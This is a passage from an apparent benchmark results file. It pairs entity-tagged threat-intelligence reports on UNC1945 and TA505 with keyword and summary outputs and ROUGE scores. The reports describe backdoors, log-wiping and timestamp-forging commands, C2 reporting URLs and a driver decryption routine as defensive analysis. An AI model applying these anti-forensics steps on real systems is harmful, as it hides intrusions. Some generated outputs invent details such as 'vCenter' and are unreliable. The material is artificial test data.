0.0, "gpt3/lexical/rouge_rouge1": 0.518867924528302, "gpt3/lexical/rouge_rouge2": 0.21800947867298578, "gpt3/lexical/rouge_rougeL": 0.3113207547169812, "gpt3/lexical/rouge_rougeLsum": 0.3113207547169812, "gpt3_generated_text": ["The article discusses the cyber capabilities of North Korea and how they are linked to government organizations. According to Mandiant, most of North Korea's cyber operations, including espionage, destructive operations, and financial crimes, are conducted by the Reconnaissance General Bureau. The Ministry of State Security and United Front Department have limited roles in North Korea's cyber program. The United Front Department focuses on disseminating pro-regime propaganda targeting South Korea, while the Ministry of State Security is primarily tasked with domestic counterespionage and overseas counterintelligence activities. APT37, a threat actor associated with North Korea, aligns with the agenda of the Ministry of State Security. The Reconnaissance General Bureau is the primary foreign intelligence service of North Korea, with the 3rd Bureau (Foreign Intelligence) and 5th Bureau (Inter-Korean Affairs) playing key roles in the country's cyber program. Lab 110, a part of the Reconnaissance General Bureau, is likely the focal point for the Lazarus Group, an umbrella term referring to various clusters of cyber operators. The article highlights the flexibility and resilience of North Korea's intelligence apparatus in creating cyber units based on the country's needs. The overlap in infrastructure, malware, and tactics among North Korea's cyber operations suggests shared resources. Understanding the different institutions within North Korea and their evolving cyber capabilities can help organizations defend against these threats."]}, {"split_name": "val", "sample_id": "val_92", "prompt_text": "Extract the keywords: Live off the Land ? How About Bringing Your [LOC] Own [LOC] Island ? An Overview of UNC1945fireeye.com/blog/threat-research/2020/11/live-off-the-land-an-overview-of-unc1945.htmlThrough Mandiant investigation of intrusions , the FLARE Advanced Practices team observed a group we track as [PERSON] UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to [ORDINAL] third - party networks ( see this blog post for an in - depth description of \u201c [ORG] UNC \u201d groups).UNC1945 targeted [ORG] Oracle [ORG] Solaris operating systems , utilized several tools and utilities against Windows and Linux operating systems , loaded and operated custom virtual machines , and employed techniques to evade detection . [PERSON] UNC1945 demonstrated access to exploits , tools and malware for multiple operating systems , a disciplined interest in covering or manipulating their activity , and displayed advanced technical abilities during interactive operations . Mandiant discovered and reported to [LAW] Oracle CVE-2020 - 14871 , which was addressed in [ORG] Oracle 's [DATE] October [DATE] 2020 Critical Patch Update . Mandiant recommends staying current on all current patch updates to ensure a high security posture . We will discuss this vulnerability in greater detail in a follow up blog post . [PERSON] UNC1945 [PERSON] Attack [PERSON] LifecycleThe threat actor demonstrated experience and comfort by utilizing unique tactics , techniques and procedures ( TTPs ) within Unix environments , demonstrating a high level of acumen in conjunction with ease of operability in [ORG] Microsoft [PRODUCT] Windows operating systems . They were successful navigating multiple segmented networks and leveraging [ORDINAL] third - party access to extend operations well beyond the initial victim . Furthermore , [PERSON] UNC1945 operated from several virtual machines pre - configured with post - exploitation tools in addition to their custom toolset to evade detection and forensics . Initial [ORG] CompromiseIn [DATE] late [DATE] 2018 , [PERSON] UNC1945 gained access to a [PERSON] Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise . The [ORG] SSH service of this server was exposed to the internet at the time , the same time we observed [ORDINAL] first evidence of threat activity . Unfortunately , due to insufficient available evidence , the next indication of activity was in [DATE] mid-2020 at which time a different [PERSON] Solaris server was observed connecting to the threat actor infrastructure . This indicates a dwell time of [DATE] approximately [DATE] 519 [DATE] days based on recovered artifacts . Although we were unable to determine how the [DATE] late-2018 initial access was accomplished , we did observe successful [PERSON] UNC1945 [ORG] SSH connections directly to the victim Solaris [CARDINAL] 10 server , since the [ORG] SSH service was exposed directly to the internet at the time.1/9In mid-2020 , we observed [PERSON] UNC1945 deploy EVILSUN \u2014 a remote exploitation tool containing a zero - [DATE] day exploit for CVE-2020 - 14871 \u2014 on a Solaris [CARDINAL] 9 server . At the time , connections from the server to the threat actor IP address were observed over port 8080.Mandiant discovered and reported CVE-2020 - 14871 , a recently patched vulnerability in [ORG] the [ORG] Oracle [ORG] Solaris [ORG] Pluggable [ORG] Authentication [ORG] Module ( [ORG] PAM ) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system . According to an [DATE] April [DATE] 2020 post on a black - market website , an \u201c [ORG] Oracle [ORG] Solaris [ORG] SSHD [ORG] Remote [ORG] Root [ORG] Exploit \u201d was available for [MONEY] approximately $ 3,000 [MONEY] USD , which may be identifiable with [ORG] EVILSUN . Additionally , we confirmed a [PERSON] Solaris server exposed to the internet had critical vulnerabilities , which included the possibility of remote exploitation without authentication . [ORG] Establish [ORG] Foothold and Maintain PersistenceThe threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as [ORG] SLAPSTICK to establish a foothold on a Solaris [CARDINAL] 9 server . This facilitated user access to the system with a secret hard - coded password and allowed the threat actors to escalate privileges and maintain persistence ( see Figure 1).Log \u2013 font \u2013 unix | /usr / lib / ssh / sshd sshd kbdint - can < Encoded Password > < IP REDACTED > Magical Password auth.info | sshd[11800 ] : [ ID 800047 auth.info ] Accepted keyboard - interactive for root from < IP REDACTED > port [CARDINAL] 39680 ssh2 auth.notice | su : [ ID 366847 auth.notice ] \u2018 su root \u2019 - succeeded for netcool on /dev / pts/31Figure [CARDINAL] 1 : SLAPSTICK logsAt the initial victim , [PERSON] UNC1945 placed a copy of a legitimate pam_unix.so file and [ORG] SLAPSTICK in the /lib64 / security folder . [DATE] A [DATE] day [DATE] later , the threat actor positioned a custom Linux backdoor , which [ORG] Mandiant named [PERSON] LEMONSTICK , on the same workstation . LEMONSTICK capabilities include command execution , file transfer and execution , and the ability to establish tunnel connections . ( see Figure [CARDINAL] 2).FileItem : changed | /usr / lib64 / security / [PERSON] pam_unix , so [ 57720 ] Audit log | [ audit_type : USER_END ] user [PERSON] pid=10080 uid=0 auid=0 msg='PAM : FileItem : Accessed | /var / tmp/.cache / ocb_staticFigure [CARDINAL] 2 : [PERSON] UNC1945 emplacement of SLAPSTICK2/9UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly . [ORG] SSH [ORG] Port [ORG] Forwarding is a mechanism implemented in [ORG] SSH protocol for transporting arbitrary networking data over an encrypted [ORG] SSH connection ( tunneling ) . This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet . The [PERSON] UNC1945 configurations we observed are similarly structured with respect to the host alias , specified options , and option order ( see Figure 3).config1config2Host < redacted > UserKnownHostsFile /dev / null UserKnownHostsFile /dev / null [ORG] RemoteForward [ORG] 2224 < redacted>:22Figure [CARDINAL] 3 : [ORG] SSH config files used by [PERSON] UNC1945 at different incidentsAs part of this multi - stage operation , [PERSON] UNC1945 dropped a custom [ORG] QEMU [ORG] Virtual [ORG] Machine ( VM ) on multiple hosts , which was executed inside of any Linux system by launching a \u2018 start.sh \u2019 script . The script contained [ORG] TCP forwarding settings that could be used by the threat actor in conjunction with the [ORG] SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure . The VM was running a version of the Tiny Core Linux OS with pre - loaded scripts and tools . Also , we analyzed [ORG] the [ORG] Virtual [ORG] Machine file system timestamps , which coincided with [PERSON] UNC1945 's overall operational timeline . The VM contained numerous tools such as network scanners , exploits and reconnaissance tools . [PERSON] Tiny [PERSON] Core [PERSON] Linux pre - loaded tools included [PERSON] Mimikatz , [GPE] Powersploit , [ORG] Responder , [ORG] Procdump , CrackMapExec , [ORG] PoshC2 , [ORG] Medusa , [ORG] JBoss [ORG] Vulnerability [ORG] Scanner and more . Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory . Additionally , [PERSON] UNC1945 used built - in utilities and public tools to modify timestamps and selectively manipulate Unix log files . [PERSON] UNC1945 employed anti - forensics techniques with the use of a custom [ORG] ELF utility named [PERSON] LOGBLEACH . The actor used built - in Linux commands to alter the timestamps of files and directories and used [PERSON] LOGBLEACH to clean logs to thwart forensic analysis , as seen in Figure 4.3/9 $ ./b -C -y -a $ mv b /usr / lib64 / libXbleach.so.1 $ cd /usr / lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -r libyaml-0.so.2Figure [CARDINAL] 4 : LOGBLEACHTo further obfuscate activity , a Linux ELF packer named STEELCORGI was executed in memory on the [PERSON] Solaris system . The malware contains various anti - analysis techniques , including anti - debugging , anti - tracing , and string obfuscation . It uses environment variables as a key to unpack the final payload . Escalate Privileges and Lateral MovementAfter successfully establishing a foothold , [PERSON] UNC1945 collected credentials , escalated privileges , and successfully moved laterally through multiple networks . [PERSON] UNC1945 obtained credentials via [ORG] SLAPSTICK and open source tools such as [PERSON] Mimikatz , which enabled easy lateral movement throughout networks to obtain immediate access to other segments of the network and [ORDINAL] third - party environments . Stolen credentials collected by [ORG] SLAPSTICK were used to traverse the customer network via [ORG] SSH and deploy SLAPSTICK to additional hosts . After successfully authenticating , SLAPSTICK displays a welcome message , as seen in Figure [CARDINAL] 5.Figure [CARDINAL] 5 : SLAPSTICK backdoor welcome bannerUNC1945 used [ORG] ProxyChains to download [ORG] PUPYRAT , an open source , cross - platform multi - functional remote administration and post - exploitation tool mainly written in Python . At [CARDINAL] one target , the threat actor used a virtual machine to initiate a brute - force of [ORG] SSH targeting Linux and HP - UX endpoints . Beginning with seemingly random usernames and shifting to legitimate Linux and Windows accounts , the threat actor successfully established [ORG] SSH connections on a Linux endpoint . After successfully escalating privileges on an HP - UX endpoint and a Linux endpoint , [PERSON] UNC1945 installed [CARDINAL] three backdoors : [ORG] SLAPSTICK , [ORG] TINYSHELL , and OKSOLO.We observed [PERSON] UNC1945 use [ORG] IMPACKET with [ORG] SMBEXEC in a [ORG] Microsoft [PRODUCT] Windows environment to execute commands remotely without the need to upload a payload to the target . [ORG] SMBEXEC allows the threat actor to operate like [ORG] PsExec , but without using RemComSvc . There are [CARDINAL] two main modes of using this tool that benefits attackers . Share mode allows the specification of a share that everything will be executed through . Server mode permits the output of the executed commands to be sent back by the target machine into a locally shared folder.4/9At [CARDINAL] one victim , we observed [PERSON] UNC1945 moving laterally via [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) to a Windows server before viewing the [ORG] Server Manager Panel , viewing and modifying RDP - related system firewall rules and checking the application settings of [CARDINAL] two endpoint security services . Internal ReconnaissanceMandiant investigations found that the threat actor maintains various tools to interact with victim networks . In addition to custom tools , the [PERSON] UNC1945 VMs contained various tools ( e.g. network scanners , exploits and reconnaissance ; see [PERSON] Associated [PERSON] Tools and [PERSON] Malware section).In some intrusions , [PERSON] UNC1945 employed a [ORG] SPARC executable identified as a reconnaissance tool . Based on publicly available information , this executable could be referred to as [NORP] Luckscan or [PRODUCT] BlueKeep , the latter of which is part of the [ORG] BKScan toolkit ( see Figure 6).Figure 6 : SPARC executable recon tool command line used by the threat actorAccording to open sources , [ORG] BlueKeep , aka \u201c bkscan \u201d scanner , works both unauthenticated and authenticated ( i.e. when Network Level Authentication is enabled ) . BlueKeep ( CVE- 2019 - 0708 ) is a security vulnerability that was discovered in [ORG] Microsoft 's [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) implementation , which allows for the possibility of remote code execution . Complete MissionDespite this multi - staged operation , [ORG] Mandiant did not observe evidence of data exfiltration and was unable to determine [PERSON] UNC1945 's mission for most of the intrusions we investigated . In [CARDINAL] at [CARDINAL] least [CARDINAL] one case , we observed [NORP] ROLLCOAST ransomware deployment in the final phase of the threat actor activity , but [ORG] Mandiant did n\u2019t attribute this activity to [PERSON] UNC1945 . At this time , it is likely that access to the victim environment was sold to another group . ConclusionThe ease and breadth of exploitation in which [PERSON] UNC1945 conducted this campaign suggests a sophisticated , persistent actor comfortable exploiting various operating systems , and access to resources and numerous toolsets . Given the aforementioned factors , use of zero - [DATE] day exploits and virtual machines , and ability to traverse multiple [ORDINAL] third - party networks , [ORG] Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility.5/9Associated [ORG] Tools and Malware FamiliesEVILSUN is a remote exploitation tool that gains access to [PERSON] Solaris [CARDINAL] 10 and [CARDINAL] 11 systems of SPARC or i386 architecture using a vulnerability ( CVE-2020 - 14871 ) exposed by [ORG] SSH keyboard - interactive authentication . The remote exploitation tool makes [ORG] SSH connections to hosts passed on the command line . The default port is the normal [ORG] SSH port ( [CARDINAL] 22 ) , but this may be overridden . EVILSUN passes the banner string SSH-2.0 - Sun_SSH_1.1.3 over the connection in clear text as part of handshaking . [PERSON] LEMONSTICK is a Linux executable command line utility with backdoor capabilities . The backdoor can execute files , transfer files , and tunnel connections . LEMONSTICK can be started in [CARDINAL] two different ways : passing the ` -c ` command line argument ( with an optional file ) and setting the \u2018 OCB \u2019 environment variable . When started with the ` -c ` command line argument , [PERSON] LEMONSTICK spawns an interactive shell . When started in OCB mode , [PERSON] LEMONSTICK expects to read from [ORG] STDIN . The [ORG] STDIN data is expected to be encrypted with the blowfish algorithm . After decrypting , it dispatches commands based on the name \u2014 for example : \u2018 executes terminal command \u2019 , \u2018 connect to remote system \u2019 , \u2018 send & retrieve file \u2019 , \u2018 create socket connection\u2019 . [PERSON] LOGBLEACH is an [ORG] ELF utility that has a primary functionality of deleting log entries from a specified log file(s ) based on a filter provided via command line . The following log files are hard coded in the malware , but additional log paths may be specified:/var / run / utmp /var / log / wtmp /var / log / btmp /var / log / lastlog /var / log / faillog /var / log / syslog /var / log / messages /var / log / secure /var / log / auth.logOKSOLO is a publicly available backdoor that binds a shell to a specified port . It can be compiled to support password authentication or dropped into a root shell . OPENSHACKLE is a reconnaissance tool that collects information about logged - on users and saves it to a file . OPENSHACKLE registers Windows Event Manager callback to achieve persistence . ProxyChains allows the use of [ORG] SSH , [ORG] TELNET , [ORG] VNC , [ORG] FTP and any other internet application from behind HTTP ( HTTPS ) and SOCKS ( [CARDINAL] 4/5 ) proxy servers . This \" proxifier \" provides proxy server support to any application . PUPYRAT ( aka Pupy ) is an open source , multi - platform ( Windows , Linux , [ORG] OSX , [ORG] Android ) , multi - function [ORG] RAT ( [ORG] Remote [ORG] Administration [ORG] Tool ) and post - exploitation tool mainly written in Python . It features an all - in - memory execution guideline and leaves6/9very low footprint . It can communicate using various transports , migrate into processes ( reflective injection ) , and load remote Python code , Python packages and Python C- extensions from memory . STEELCORGI is a packer for Linux ELF programs that uses key material from the executing environment to decrypt the payload . When [ORDINAL] first starting up , the malware expects to find up to [CARDINAL] four environment variables that contain numeric values . The malware uses the environment variable values as a key to decrypt additional data to be executed . SLAPSTICK is a [GPE] Solaris [GPE] PAM backdoor that grants a user access to the system with a secret , hard - coded password . [ORG] TINYSHELL is a lightweight client / server clone of the standard remote shell tools ( rlogin , telnet , ssh , etc . ) , which can act as a backdoor and provide remote shell execution as well as file transfers . DetectionsFE_APT_Trojan_Linux_STEELCORGI_1 HackTool . Linux . EVILSUN.MVX HXIOC UUID : e489ce60 - f315 - 4d1a - a888 - 77782f687eec [ORG] EVILSUN ( FAMILY ) [CARDINAL] 90005075FE_Trojan_Linux_LEMONSTICK_1 HXIOC UUID : [CARDINAL] 4a56fb0c-6134 - 4450 - ad91 - 0f622a92701c OPENSHACKLE ( UTILITY ) [DATE] 90005006 [ORG] HXIOC , [CARDINAL] 45632ca0 - a20b-487f-841c - c74ca042e75a ; [NORP] ROLLCOAST RANSOMWARE ( FAMILY ) [ORG] Mandiant experts from the [NORP] FLARE team will present an in - depth view into [PERSON] UNC1945 on Thursday , [DATE] Nov. [DATE] 12 . Register [DATE] today to reserve your spot for this discussion , where the presenters from [NORP] FLARE and Mandiant Managed Defense will also answer questions from the audience . Finally , for more intelligence on these types of threats , please register for [ORG] Mandiant [ORG] Advantage [ORG] Free , a no - cost version of our threat intelligence platform.9/9", "generated_text": "UNC1945; managed service providers; financial and professional consulting industries; access; third-party networks; the threat actor; use; tools; malware; Windows; Linux; custom virtual machines; TTPs; the second half of 2019; a Solaris server; the threat actor; Oracle CVE-2020-14871; critical patch updates; a foothold; a Solaris 9 server; connections; port 8080; the Solaris Pluggable Authentication Module; SLAPSTICK; connections; connections; the Solaris 9 server; the malware; persistence; the Solaris 10 server; the SSH server; Indicators; Incident; the threat actor; the infrastructure; collaboration; attribution; vCenter; protection.", "ref_text": "<START-1>The report describes the activities of a threat actor group tracked as UNC1945 by Mandiant researchers. UNC1945 targeted financial and professional consulting organizations by compromising managed service providers and moving laterally through networks. Initial access was gained in late 2018 by exploiting a Solaris server exposed to the internet. The actor used custom backdoors like SLAPSTICK and LEMONSTICK to establish persistence. A zero-day exploit called EVILSUN was used to compromise Solaris servers. UNC1945 escalated privileges using stolen credentials collected by SLAPSTICK and tools like Mimikatz. They moved laterally through networks via RDP and SSH. Virtual machines with hacking tools were deployed to avoid detection. Anti-forensics tools like LOGBLEACH were used to manipulate timestamps and delete logs. The custom malware STEELCORGI used environment variables as decryption keys. While internal reconnaissance was conducted with tools like Luckscan/BlueKeep, no data exfiltration was observed. ROLLCOAST ransomware was deployed in some cases. UNC1945 demonstrated technical sophistication, utilizing exploits, custom malware, virtual machines, and advanced lateral movement techniques. Their motivations appear to be gaining and selling access rather than conducting cyber espionage or data theft. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3489583333333333, "gpt3/lexical/rouge_rouge2": 0.07329842931937174, "gpt3/lexical/rouge_rougeL": 0.17708333333333334, "gpt3/lexical/rouge_rougeLsum": 0.17708333333333334, "gpt3_generated_text": ["The article discusses the activities of a threat actor group known as UNC1945, which has targeted managed service providers and specific industries such as finance and professional consulting. The group has gained access to third-party networks and has demonstrated advanced technical abilities in operating systems such as Windows and Linux. They have used a variety of tools and malware, including custom virtual machines, to evade detection. The article highlights specific incidents of compromise, including the installation of backdoors and the exploitation of vulnerabilities in Oracle Solaris operating systems. It also emphasizes the importance of staying up to date with patch updates for maintaining a high level of security. The threat actor group has shown expertise in Unix environments as well as ease of operability in Windows operating systems. They have successfully navigated segmented networks and extended their operations through third-party access. The article provides details about the initial compromise, the establishment of a foothold, and the maintenance of persistence by the threat actors. It also mentions specific indicators and incidents related to the group's activities. The article concludes by highlighting the need for collaboration and attribution in addressing such threats and the importance of protection measures such as vCenter."]}, {"split_name": "val", "sample_id": "val_93", "prompt_text": "Extract the keywords: Tracking a P2P network related to TA505research.nccgroup.com/2021/12/01/tracking-a-p2p-network-related-with-ta505/This post is by [PERSON] Nikolaos [PERSON] Pantazopoulos and [PERSON] Michael [PERSON] SandeeDecember 1 , [CARDINAL] 2021tl;dr \u2013 Executive Summary For [DATE] the [DATE] past [DATE] few [DATE] months [ORG] NCC [ORG] Group has been closely tracking the operations of TA505 and the development of their various projects ( e.g. [PERSON] Clop ) . During this research we encountered a number of binary files that we have attributed to the developer(s ) of \u2018 Grace \u2019 ( i.e. [WORK_OF_ART] FlawedGrace ) . These included a remote administration tool ( RAT ) used exclusively by TA505 . The identified binary files are capable of communicating with each other through a peer - to - peer ( P2P ) network via [ORG] UDP . While there does not appear to be a direct interaction between the identified samples and a host infected by \u2018 Grace \u2019 , we believe with medium to high confidence that there is a connection to the developer(s ) of \u2018 Grace \u2019 and the identified binaries . In summary , we found the following : P2P binary files , which are downloaded along with other [GPE] Necurs components ( signed drivers , block lists ) P2P binary files , which transfer certain information ( records ) between nodes Based on the network IDs of the identified samples , there seem to be [CARDINAL] at [CARDINAL] least [CARDINAL] three different networks running The programming style and dropped file formats match the development standards of \u2018 Grace\u2019History of TA505 \u2019s Shift to Ransomware Operations2014 : Emergence as a group The threat actor , often referred to as TA505 publicly , has been distinguished as an independent threat actor by [ORG] NCC [ORG] Group since [DATE] 2014 . Internally we used the name \u201c [ORG] Dridex [ORG] RAT group \u201d . Initially it was a group that integrated quite closely with [ORG] EvilCorp , utilising their [ORG] Dridex banking malware platform to execute relatively advanced attacks , using often custom made tools for a single purpose and repurposing commonly available tools such as \u2018 Ammyy Admin \u2019 and \u2018 RMS\u2019/\u2019RUT \u2019 to complement their arsenal . The attacks performed mostly consisted of compromising organisations and social engineering victims to execute high value bank transfers to corporate mule accounts . These operations included social engineering correctly implemented [CARDINAL] two - factor authentication with dual authorization by both the creator of a transaction and the authorizee.2017 : Evolution [DATE] Late [DATE] 2017 , [ORG] EvilCorp and TA505 ( [ORG] Dridex [ORG] RAT [ORG] Group ) split as a partnership . Our hypothesis is that [ORG] EvilCorp had started to use the [PERSON] Bitpaymer ransomware to extort organisations rather than doing banking fraud . This built on the fact they had already been using the [PERSON] Locky ransomware previously and was attracting unwanted attention . [ORG] EvilCorp \u2019s ability to execute enterprise ransomware across large- scale businesses was [ORDINAL] first demonstrated in [DATE] May [DATE] 2017 . Their capability and success at pulling off such attacks stemmed from [DATE] the [DATE] numerous [DATE] years of experience in compromising corporate networks for banking fraud activity , specifically moving laterally to separate hosts controlled by employees who had the required access and control of corporate bank accounts . The same techniques in relation to lateral movement and tools ( such as [GPE] Empire , Armitage , Cobalt Strike and [GPE] Metasploit ) enabled [ORG] EvilCorp to become highly effective in targeted ransomware attacks . However in [DATE] 2017 TA505 went on their own path and specifically in [DATE] 2018 executed a large number of attacks using the tool called \u2018 [WORK_OF_ART] Grace [WORK_OF_ART] \u2019 , also known publicly as \u2018 FlawedGrace \u2019 and \u2018 GraceWire \u2019 . The victims were mostly financial institutions and a large number of the victims were located in [LOC] Africa , [LOC] South [LOC] Asia , and [LOC] South [LOC] East [LOC] Asia with confirmed fraudulent wire transactions and card data theft originating from victims of TA505 . The tool \u2018 Grace \u2019 had some interesting features , and showed some indications that it was originally designed as banking malware which had latterly been repurposed . However , the tool was developed and was used in [CARDINAL] hundreds of victims worldwide , while remaining relatively unknown to the wider public in [DATE] its [DATE] first [DATE] years of use.2019 : [PERSON] Clop and wider tooling In [DATE] early [DATE] 2019 , TA505 started to utilise the [PERSON] Clop ransomware , alongside other tools such as \u2018 SDBBot \u2019 and \u2018 ServHelper \u2019 , while continuing to use \u2018 Grace \u2019 up to and including [DATE] 2021 . [DATE] Today it appears that the group has realised the potential of ransomware operations as a viable business model and the relative ease with which they can extort large sums of money from victims . The remainder of this post dives deeper into a tool discovered by [ORG] NCC [ORG] Group that we believe is related to TA505 and the developer of \u2018 Grace \u2019 . We assess that the identified tool is part of a bigger network , possibly related with [ORG] Grace infections . Technical Analysis The technical analysis we provide below focuses on [CARDINAL] three components of the execution chain:1 . A downloader \u2013 Runs as a service ( each identified variant has a different name ) and downloads the rest of the components alongwith a target processes / services list that the driver uses while filtering information . [PERSON] Necurs have used similar downloaders in the past.1/52 . A signed driver ( both x86 and x64 available ) \u2013 Filters processes / services in order to avoid detection and/or prevent removal . Inaddition , it injects the payload into a new process.3 . Node tool \u2013 Communicates with other nodes in order to transfer victim \u2019s data . It should be noted that for all above components , different variations were identified . However , the core functionality and purposes remain the same . Upon execution , the downloader generates a GUID ( used as a bot ID ) and stores it in the [PRODUCT] ProgramData folder under the filename regid.1991-06.com.microsoft.dat . Any downloaded file is stored temporarily in this directory . In addition , the downloader reads the version of crypt32.dll in order to determine the version of the operating system . Next , it contacts the command and control server and downloads the following files : t.dat \u2013 Expected to contain the string \u2018 kwREgu73245Nwg7842h [WORK_OF_ART] \u2019 [WORK_OF_ART] p3.dat [WORK_OF_ART] \u2013 [WORK_OF_ART] P2P [WORK_OF_ART] Binary . Saved as \u2018 payload.dll \u2019 d1c.dat \u2013 x86 ( signed ) Driver d2c.dat \u2013 x64 ( signed ) Driver bn.dat \u2013 List of processes for the driver to filter . Stored as \u2018 blacknames.txt \u2019 bs.dat \u2013 List of services \u2019 name for the driver to filter . Stored as \u2018 blacksigns.txt \u2019 bv.dat \u2013 List of files \u2019 version names for the driver to filter . Stored as \u2018 blackvers.txt \u2019 . r.dat \u2013 List of registry keys for the driver to filter . Stored as \u2018 registry.txt\u2019The network communication of the downloader is simple . [ORDINAL] Firstly , it sends a GET request to the command and control server , downloads and saves on disk the appropriate component . Then , it reads the component from disk and decrypts it ( using the RC4 algorithm ) with the hardcoded key \u2018 ABCDF343fderfds21 \u2019 . After decrypting it , the downloader deletes the file . Depending on the component type , the downloader stores each of them differently . Any configurations ( e.g. list of processes to filter ) are stored in registry under the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID with the value name being the thread ID of the downloader . The data are stored in plaintext with a unique ID value at the start ( e.g. [PERSON] 0x20 for the processes list ) , which is used later by the driver as a communication method . In addition , in one variant , we detected a reporting mechanism to the command and control server for each step taken . This involves sending a GET request , which includes the generated bot ID along with a status code . The below table summarises each identified request ( [LAW] Table [LAW] 1).RequestDescription / c / p1 / dnsc.php?n=%s&in=%sFirst parameter is the bot ID and the [ORDINAL] second is the formatted string ( \u201c Version_is_%d.%d_(%d)_%d__ARCH_%d \u201d ) , which contains operating system info / c / p1 / dnsc.php ? n=%s&sz = DS_%d / c / p1 / dnsc.php ? n=%s&er = ERR_%dFirst parameter is the bot ID and the [ORDINAL] second is the downloaded driver \u2019s sizeFirst parameter is the bot ID and the [ORDINAL] second is the error code / c / p1 / dnsc.php?n=%s&c1=1The [ORDINAL] first parameter is the bot ID . Notifies the server that the driver was installed successfully / c / p1 / dnsc.php ? n=%s&c1=1&er = REB_ERR_%dFirst parameter is the bot ID and the [ORDINAL] second is the error code obtained while attempting to shut down the host after finding [PERSON] Windows [PERSON] Defender running / c / p1 / dnsc.php ? n=%s&sz = ErrList_%d_%First parameter is the bot ID , [ORDINAL] second parameter is the resulted error code while retrieving the blocklist processes . The [ORDINAL] third parameter is set to [CARDINAL] 1 . The same command is also issued after downloading the blacklisted services \u2019 names and versions . The only difference is on the [ORDINAL] third parameter , which is increased to \u2018 2 \u2019 for blacklisted services , \u2018 3 \u2019 for versions and \u2018 4 \u2019 for blacklisted registry keys / c / p1 / dnsc.php ? n=%s&er = PING_ERR_%dFirst parameter is the bot ID and the [ORDINAL] second parameter is the error code obtained during the driver download process / c / p1 / dnsc.php ? n=%s&c1=1&c2=1First parameter is the bot ID . Informs the server that the bot is about to start the downloading process./c / p1 / dnsc.php ? n=%s&c1=1&c2=1&c3=1First parameter is the bot ID . Notified the server that the payload ( node tool ) was downloaded and stored successfullyTable [CARDINAL] 1 \u2013 Reporting to C2 requestsDriver Analysis The downloaded driver is the same one that [PERSON] Necurs uses . It has been analysed publically already [ 1 ] but in summary , it does the following . In the [ORDINAL] first stage , the driver decrypts shellcode , copies it to a new allocated pool and then executes the payload . Next , the shellcode decrypts and runs ( in memory ) another driver ( stored encrypted in the original file ) . The decryption algorithm remains the same in both cases:2/5xor_key = extracted_xor_key for i in range(0,payload_size,4):data = encrypted[i : i+4 ] value = int.from_bytes ( data , ' little ' ) ^ xor_key result + = ( _ rol(value , bits , [DATE] 32 ) ^ xor_key).to_bytes(4,'little')Eventually , the decrypted driver injects the payload ( the P2P binary ) into a new process ( \u2018 wmiprvse.exe \u2019 ) and proceeds with the filtering of data . A notable piece of code of the driver is the strings \u2019 decryption routine , which is also present in recent GraceRAT samples , including the same [WORK_OF_ART] XOR key ( 1220A51676E779BD877CBECAC4B9B8696D1A93F32B743A3E6790E40D745693DE58B1DD17F65988BEFE1D6C62D5416B25BB78EF06Payload Attribution and Analysis The identified sample is written in [LANGUAGE] C++ and interacts with other nodes in the network using [ORG] UDP . We believe that the downloaded binary file is related with TA505 for ( at least ) the following reasons:1 . Same serialisation library [CARDINAL] 2 . Same programming style with \u2018 Grace \u2019 samples [CARDINAL] 3 . Similar naming convention in the configuration \u2019s keys with \u2018 Grace \u2019 samples [CARDINAL] 4 . Same output files ( dsx ) , which we have seen in previous TA505 compromises . [ORG] DSX files have been used by \u2018 Grace \u2019 operators tostore information related with compromised machines . [ORG] Initialisation [ORG] Phase In the initialisation phase , the sample ensures that the configurations have been loaded and the appropriate folders are created . All identified samples store their configurations in a resource with name XC .ANALYST NOTE : Due to limit visibility of other nodes , we were not able to identify the purpose of each key of the configurations . The [ORDINAL] first configuration stores the following settings : cx \u2013 [GPE] Parent name nid \u2013 [ORG] Node ID . This is used as a network identification method during network communication . If the incoming network packet does not have the same ID then the packet is treated as a packet from a different network and is ignored . dgx \u2013 Unknown exe \u2013 Binary mode flag ( DLL / EXE ) key \u2013 [ORG] RSA key to use for verifying a record port \u2013 UDP port to listen va \u2013 [GPE] Parent name . It includes the node IPs to contact . The [ORDINAL] second configuration contains the following settings ( or metadata as the developer names them):meta \u2013 [GPE] Parent name app \u2013 Unknown . Probably specifies the variant type of the server . The following seem to be supported : target ( this is the current set value ) controlmod \u2013 Specifies if current binary is the core module . llt- [ORG] UnknownNext , the sample creates a set of folders and files in a directory named \u2018 target \u2019 . These folders are : [PERSON] node ( folder ) \u2013 Stores records of other nodes trash ( folder ) \u2013 Move files for deletion units ( folder ) \u2013 Unknown . Appears to contain [ORG] PE files , which the core module loads . sessions ( folder ) \u2013 Active nodes \u2019 sessions units.dsx ( file ) \u2013 List of \u2018 units \u2019 to load probes.dsx ( file ) \u2013 Stores the connected nodes IPs along with other metadata ( e.g. connection timestamp , port number ) net.dsx ( file ) \u2013 [ORG] Node peer name reports.dsx ( file ) \u2013 Used in recent versions only . Unknown purpose . Network communication After the initialisation phase has been completed , the sample starts sending [ORG] UDP requests to a list of [ORG] IPs in order to register itself into the network and then exchange information.3/5Every network packet has a header , which has the below structure : struct [PERSON] Node_Network_Packet_Header { [PERSON] BYTE [PERSON] XOR_Key ; [ORG] BYTE [ORG] Version ; // set to [CARDINAL] 0x37 ( ' 7 ' ) [PERSON] BYTE Encrypted_node_ID[16 ] ; // [PERSON] XORed with XOR_Key above [PERSON] BYTE [PERSON] Peer_Name[16 ] ; // Xored with XOR_Key above . Connected peer name [ORG] BYTE [ORG] Command_ID ; //Internally called frame type [PERSON] DWORD [PERSON] Watermark ; //XORed with XOR_Key above [ORG] DWORD [ORG] Crc32_Data ; //CRC32 of above data};When the sample requires adding additional information in a network packet , it uses the below structure : struct Node_Network_Packet_Payload 